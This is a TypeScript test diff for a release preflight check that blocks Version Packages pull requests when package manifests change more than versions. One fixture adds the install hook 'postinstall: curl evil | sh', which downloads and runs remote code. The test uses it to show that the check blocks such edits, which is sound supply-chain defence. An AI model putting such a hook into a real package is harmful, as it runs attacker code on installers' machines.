@@ -10,9 +10,17 @@ const HEAD = fakeSha("version-packages-head");
 const AUTO: EffectivePolicy = { ...OWNER_GATE_POLICY, merge: "auto", seat: "trusted-seat" };
 const onNpm = (...names: string[]): PackageRegistry => async (name) => names.includes(name);
 
-const manifest = (name: string, extra: object = {}) => JSON.stringify({ name, version: "1.2.0", ...extra });
+const BASE = fakeSha("base");
+const WIDGET = { name: "@demo/widget", version: "1.1.0", scripts: { build: "tsc" }, dependencies: { zod: "^4.0.0" } };
+const APP = { name: "@demo/app", version: "0.3.0", private: true, dependencies: { "@demo/widget": "workspace:^1.1.0" } };
 
-/** A Version Packages PR that bumps a public package, a private product and the root, and consumes one changeset. */
+/** Writes a manifest at the merge base and at the head, as `changeset version` would leave it. */
+function setManifest(fake: FakeGitHub, path: string, base: object, head: object): void {
+  fake.files.set(`${BASE}:${path}`, { content: JSON.stringify(base), blobSha: `${path}-base` });
+  fake.files.set(`${HEAD}:${path}`, { content: JSON.stringify(head), blobSha: `${path}-head` });
+}
+
+/** A Version Packages PR that bumps a public package and a private product that depends on it, and consumes one changeset. */
 function versionPackagesPr(files: PrFile[] = []): FakeGitHub {
   const fake = fakeGitHub();
   fake.addPr({ headSha: HEAD, headRef: VERSION_PACKAGES_BRANCH, headRepo: REPO });
@@ -22,10 +30,11 @@ function versionPackagesPr(files: PrFile[] = []): FakeGitHub {
     { path: "products/app/package.json", status: "modified" },
     { path: ".changeset/brave-otters.md", status: "removed" },
     { path: "CAPABILITIES.md", status: "modified" },
+    { path: "site/guides/capabilities.md", status: "modified" },
     ...files,
   ]);
-  fake.files.set(`${HEAD}:packages/widget/package.json`, { content: manifest("@demo/widget"), blobSha: "b1" });
-  fake.files.set(`${HEAD}:products/app/package.json`, { content: manifest("@demo/app", { private: true }), blobSha: "b2" });
+  setManifest(fake, "packages/widget/package.json", WIDGET, { ...WIDGET, version: "1.2.0" });
+  setManifest(fake, "products/app/package.json", APP, { ...APP, version: "0.3.1", dependencies: { "@demo/widget": "workspace:^1.2.0" } });
   return fake;
 }
 
@@ -35,8 +44,10 @@ describe("isReleaseFile", () => {
   it.each<[PrFile, boolean]>([
     [{ path: "packages/widget/package.json", status: "modified" }, true],
     [{ path: "packages/widget/CHANGELOG.md", status: "added" }, true],
-    [{ path: "pnpm-lock.yaml", status: "modified" }, true],
+    [{ path: "pnpm-lock.yaml", status: "modified" }, false],
+    [{ path: "packages/widget/package.json", status: "added" }, false],
     [{ path: "CAPABILITIES.md", status: "modified" }, true],
+    [{ path: "site/guides/capabilities.md", status: "modified" }, true],
     [{ path: ".changeset/brave-otters.md", status: "removed" }, true],
     [{ path: ".changeset/brave-otters.md", status: "added" }, false],
     [{ path: "packages/widget/src/index.ts", status: "modified" }, false],
@@ -68,6 +79,33 @@ describe("releasePreflight", () => {
     const result = await preflight(versionPackagesPr([{ path: "packages/widget/src/index.ts", status: "modified" }]));
 
     expect(result.blockers).toEqual(["it changes files a release does not write: packages/widget/src/index.ts"]);
+  });
+
+  it("blocks a manifest edit beyond version, such as an added script", async () => {
+    const fake = versionPackagesPr();
+    setManifest(fake, "packages/widget/package.json", WIDGET, { ...WIDGET, version: "1.2.0", scripts: { build: "tsc", postinstall: "curl evil | sh" } });
+
+    const result = await preflight(fake);
+
+    expect(result.blockers).toEqual(["packages/widget/package.json changes more than versions: scripts"]);
+  });
+
+  it("blocks a dependency range change for a package this release does not bump, or an added dependency", async () => {
+    const fake = versionPackagesPr();
+    setManifest(fake, "packages/widget/package.json", WIDGET, { ...WIDGET, version: "1.2.0", dependencies: { zod: "^4.1.0", "left-pad": "1.0.0" } });
+
+    const result = await preflight(fake);
+
+    expect(result.blockers).toEqual(["packages/widget/package.json changes more than versions: dependencies.zod, dependencies.left-pad"]);
+  });
+
+  it("blocks an unreadable manifest rather than failing the run", async () => {
+    const fake = versionPackagesPr();
+    fake.files.set(`${HEAD}:packages/widget/package.json`, { content: "{ not json", blobSha: "bad" });
+
+    const result = await preflight(fake);
+
+    expect(result.blockers).toContain(`packages/widget/package.json is not a readable package manifest at ${HEAD}`);
   });
 
   it("blocks a head that is not the changesets branch in this repo, or that moved", async () => {
